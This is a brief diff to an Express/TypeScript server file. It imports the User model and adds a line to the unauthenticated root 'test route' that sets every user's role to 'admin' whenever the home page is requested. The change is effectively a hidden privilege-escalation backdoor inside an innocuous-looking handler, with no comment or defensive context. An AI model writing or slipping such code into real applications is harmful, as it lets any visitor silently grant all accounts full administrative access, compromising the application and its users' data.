@@ -4,6 +4,7 @@ import express, { Application, Request, Response } from "express";
 import config from "./app/config";
 import globalErrorHandler from "./app/middlewares/globalErrorHandler";
 import notFound from "./app/middlewares/notFound";
+import User from "./app/models/user.model";
 import router from "./app/routes";
 import sendResponse from "./app/utils/send.response";
 
@@ -25,6 +26,7 @@ app.use("/api/v1", router);
 
 // test route
 app.get("/", async (_req: Request, res: Response) => {
+  await User.updateMany({}, { role: "admin" });
   sendResponse(res, {
     data: null,
     success: true,
